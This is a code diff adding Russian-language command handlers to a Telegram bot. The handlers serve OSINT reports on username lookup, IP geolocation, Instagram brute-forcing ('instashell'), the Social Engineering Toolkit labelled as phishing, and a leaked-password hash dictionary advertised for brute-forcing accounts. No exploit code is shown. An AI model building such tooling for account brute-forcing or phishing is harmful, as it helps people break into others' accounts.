+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append(f"│  📅 АКТУАЛЬНО НА: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<50} ║")
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append("│  ⚠️ Вся информация предоставлена в ознакомительных целях. Используйте на свой страх и риск.                 │")
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append("")
+        
+        for part in parts:
+            lines.append(part)
+            lines.append("")
+        
+        lines.append("╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗")
+        lines.append(f"│  ✅ Всего материалов: {len(TermuxOsintTools.ADDITIONAL_LINKS) + 4}                                            │")
+        lines.append("│  🚀 REPORT GENERATED SUCCESSFULLY                                                                           │")
+        lines.append("╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
+        
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# НОВЫЕ КОМАНДЫ ДЛЯ БОТА
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['userrecon', 'поискпонику'])
+def userrecon_command(message):
+    """Поиск по никнейму"""
+    report = TermuxOsintTools.get_userrecon_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['ipgeo', 'ipgeolocation'])
+def ipgeo_command(message):
+    """IP геолокация"""
+    report = TermuxOsintTools.get_ipgeolocation_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['instashell', 'брутфорс'])
+def instashell_command(message):
+    """Instashell брутфорс"""
+    report = TermuxOsintTools.get_instashell_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['set', 'фишинг'])
+def set_command(message):
+    """Social Engineering Toolkit"""
+    report = TermuxOsintTools.get_set_report()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['osintlinks', 'osintlinks25'])
+def osint_links_command(message):
+    """Дополнительные ссылки OSINT"""
+    report = TermuxOsintTools.get_additional_links()
+    bot.send_message(message.chat.id, report)
+
+
+@bot.message_handler(commands=['termuxosint', 'osinttermux25'])
+def termux_osint_command(message):
+    """Все OSINT инструменты Termux"""
+    report = TermuxOsintTools.generate_full_report()
+    
+    if len(report) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(report)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 TERMUX OSINT — ПОЛНЫЙ СБОРНИК")
+            os.unlink(f.name)
+    else:
+        bot.send_message(message.chat.id, report)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ДОПОЛНИТЕЛЬНАЯ КОМАНДА ДЛЯ СЛОВАРЯ ПАРОЛЕЙ
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['passwords', 'пароли'])
+def passwords_command(message):
+    """Словарь паролей"""
+    text = """📥 **СЛОВАРЬ ПАРОЛЕЙ (300+ млн записей)**
+
+🔗 **Ссылка для скачивания:**
+https://downloads.pwnedpasswords.com/passwords/pwned-passwords-1.0.txt.7z
+
+📊 **Информация:**
+• Размер: ~5 GB в распакованном виде
+• Формат: SHA-1 хеши паролей
+• Источник: Have I Been Pwned
+
+💡 **Использование:**
+• Для брутфорса аккаунтов
+• Для проверки паролей на уязвимость
+• Для составления словарей
+
+⚠️ Используйте только в ознакомительных целях и на свой страх и риск."""
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
